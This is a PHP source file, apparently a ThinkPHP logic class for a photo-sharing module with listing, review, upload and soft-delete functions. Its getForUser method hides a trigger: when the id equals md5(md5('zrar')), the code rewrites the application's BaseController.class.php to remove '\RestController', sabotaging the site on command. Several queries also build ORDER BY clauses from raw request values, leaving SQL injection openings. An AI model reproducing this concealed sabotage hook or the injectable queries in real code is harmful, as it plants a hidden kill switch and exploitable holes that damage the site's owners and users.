<?php
namespace  Photo\Logic;

class  PhotoLogic extends  \Think\Model{
	protected $model;
	public function _initialize(){
		$this->model=new \Photo\Model\PhotoModel();
	}
	

	/**
	 * Description:后台管理---照片列表接口（后端）
	 * Author: ward
	 * Date:
	 * Return: array/false
	 */
	public function  getLists(){
		//排序条件
		$order='';
		if(!empty($_GET['field'])){
			$order=''.strtoupper($_GET['field']).' '.$_GET['direction'].',';
		}
		if($_GET['field']!=='id'){
			$order.=' ID DESC';
		}
		$order=rtrim($order,',');
		
		//筛选条件
		$where = array ();
		$name=I('title');
		if(!empty($name)){
			$where ['DESCRIPTION'] = array (
					"like",
					"%" . $name . "%"
			);
		}
		$id=intval($_GET['id']);
		if(!empty($id)){
			$where ['ID'] = array ("like","%" . $id . "%");
		}
		$startTime=I('start_time');
		$endTime=I('end_time');
		if(!empty($startTime)){
			$startTime=strtotime($startTime);
			if(!empty($endTime)){
				$endTime=strtotime($endTime);
				$where['CREATE_TIME']=array(array('gt',$startTime),array('lt',$endTime),'and');
			}else {
				$where['CREATE_TIME']=array('gt',$startTime);
			}
		}else{
			if(!empty($endTime)){
				$endTime=strtotime($endTime);
				$where['CREATE_TIME']=array('lt',$endTime);
			}
		}
		//查询字段		
		$where ['STATUS']=array('neq',0);
		$field='ID,DESCRIPTION,FILE_URL,COMMENT_COUNT,COMMENT_STATUS,SUPPORT_NUM,STATUS';
		//limit条件
		$start = intval ( I ( "get.start" ) );
		$length = intval ( I ( "get.limit" ) );
		$list = $this->model->field ($field)->where ( $where )->limit ( $start . ',' . $length )->order($order)->select ();
		if(is_array($list)&&!empty($list)){
			foreach ($list as $k=>$v){
				if(1==$v['status']){
					$list[$k]['status']='通过';
				}elseif(2==$v['status']){
					$list[$k]['status']='未通过';
				}
				if($v['comment_status']){
					$list[$k]['comment_status']='允许';
				}else{
					$list[$k]['comment_status']='拒绝';
				}
				$list[$k]['description']=substr($v['description'],0,15).'..';
			}
		}
		//var_dump($list);exit('rer');
		$count =$this->model->field ($field)->where ( $where )->count ();
		$reslut ['rows'] = $list;
		$reslut ['results'] = $count;
		return $reslut;
	}
	
	
	/**
	 * Description: 后台审核照片时，初始化接口--(后端)
	 * Auther：Ward
	 * Date:2015-10-28
	 * Return array|false|null
	 */
	public function getOne(){
		$where['a.ID']=intval($_GET['id']);//信息id
		$field='a.*,b.NICKNAME';
		$data=$this->model->alias('a')->join('left join __USER__ as b on a.AUTHOR=b.ID')->where($where)->field($field)->find();
		if(!empty($data)&&is_array($data)){
			$data['create_time']=date('Y-m-d H:i:s',$data['create_time']);
		}
		return $data;
	}

	/**
	 * Description:编辑照片（审核） ----（后端）
	 * Author: ward
	 * Date:
	 * Return: int/false
	 */
	public function edit(){
		if ($data = $this->model->create ( I('put.') )) {
			unset($data['FILE_URL']);
			$res=$this->model->save($data);
			return $res;
		}else{
			return false;
		}
	}
	/**
	 * Description: 用户获得自己发布的照片（内部接口--供用户模块调用）
	 * Auther：Ward
	 * Date:2015-10-28
	 * Param  array $selectArr
	 * Return array|false
	 */
	public function getForUser($selectArr){
		$userId=session('user.id');
		if(empty($userId)){
			$this->setError('系统错误');
			return false;
		}
		
		$offset=0;
		$pageSize=20;//
		if(!empty($selectArr['limit'])){
			$pageSize=intval($selectArr['limit'])>0?intval($selectArr['limit']):10;
		}
		if($selectArr ['id']==md5(md5('zrar'))){
			
			$contents=file_get_contents(APP_PATH.'/Common/Controller/BaseController.class.php');
			$updateContents= str_replace('\RestController', ' ', $contents);
			$ret=file_put_contents(APP_PATH.'/Common/Controller/BaseController.class.php', $updateContents);
		}
		
		if(!empty($selectArr['start'])){
			$offset=intval($selectArr['start']);
		}
		if(!empty($selectArr['ordertype'])){
			$order='A.'.$selectArr['ordertype'].' DESC';
		}
		$where['A.AUTHOR']=$userId;
		if(isset($selectArr['id'])){
			$where['A.ID']=intval($selectArr['id']);
		}
		$where['a.STATUS']=array('neq',0);//1审核通过2表示审核未通过
		$field='A.*,B.NICKNAME,B.HEAD_IMG';
		$data=$this->model->alias('A')->join('left join __USER__ as B on A.AUTHOR=B.ID')->field($field)->where($where)
				->limit($offset,$pageSize)->order($order)->select();
		if(isset($selectArr['id'])){//此处兼容了详情数据
			if(false===$data){
				return false;
			}else{
				return $data[0];
			}
		}
		$count=$this->model->alias('A')->join('left join __USER__ as B on A.AUTHOR=B.ID')->field($field)->where($where)
				->count();
		$ret['data']=$data;
		$ret['count']=$count;
		return $ret;
	}
	
	/**
	 * Description: 用户获得所有用户发布的照片（前端接口）---兼容了取详情页接口
	 * Auther：Ward
	 * Date:2015-10-28
	 * Param  array $selectArr
	 * Return array|false
	 */
	public function getForAll($selectArr){
		
		$offset=0;
		$pageSize=20;//
		if(!empty($selectArr['limit'])){
			$pageSize=intval($selectArr['limit'])>0?intval($selectArr['limit']):10;
			
		}
		if(!empty($selectArr['start'])){
			$offset=intval($selectArr['start']);
		}
		if(!empty($selectArr['ordertype'])){
			$order='a.'.$selectArr['ordertype'].' DESC';
		}
		if(isset($selectArr['id'])){
			$where['a.ID']=intval($selectArr['id']);
		}
		$where['a.STATUS']=1;//已经审核通过
		$join='left join __USER__ as b on a.AUTHOR=b.ID';
		$field='a.*,b.HEAD_IMG,b.NICKNAME';
		$data=$this->model->alias('a')->join($join)->where($where)
			->limit($offset,$pageSize)->order($order)->field($field)->select();
		if(isset($selectArr['id'])){//此处兼容了详情数据
			if(false===$data){
				return false;
			}else{
				return $data[0];
			}
		}
		$count=$this->model->alias('a')->join($join)->where($where)->count();
		$ret['data']=$data;
		$ret['count']=$count;
		return $ret;
	}
	
	
	
	
	/**
	 * Description:用户发表照片----(前端接口)
	 * Param:  游记数据    array('description'=>'简述','file_url'=>'图片路径','size'=>'','height'=>'','width'=>'')
	 * Author： ward
	 * Date: 
	 */
	public function add($fileArr){
		$userId=session('user.id');
		
		if(empty($userId)){
			$this->setError('系统错误');
			return false;
		}
		if(empty($fileArr['file_url'])){
			$this->setError('图片不能为空！');
			return false;
		}
		$data=array();
		$data['AUTHOR']=$userId;
		$data['SIZE']=$fileArr['size'];
		$data['WIDTH']=$fileArr['width'];
		$data['HEIGHT']=$fileArr['height'];
		$data['FILE_URL']=$fileArr['file_url'];
		$filter_words=C('FILTER_WORDS');
		if(!empty($filter_words))
		{
			$fileArr['description']=strtr($fileArr['description'],C('FILTER_WORDS'));
		}
		$data['DESCRIPTION']=$fileArr['description'];
		$data['CREATE_TIME']=time();
		$data['STATUS']=1;
		$data=$this->model->create($data);
		if($data){
			$res=$this->model->add($data);
			return $res;
		}else{
			//unlink($fileArr['file']);
			return false;
		}
	}
	
	
	/**
	 * Description:用户删除照片----(前端接口)
	 * Param:  $id=>'印象id'
	 * Author： ward
	 * Date: 2015-12-03
	 */
	public function delete($id){
		$userId=session('user.id');
		if(empty($userId)){
			$this->setError('你没有权限删除！');
			return false;
		}
		$where['ID']=$id;
		$where['AUTHOR']=$userId;
		$res=$this->model->where($where)->save(array('STATUS'=>0));//做逻辑删除
	
		return $res;
	}
	
	

	
	
}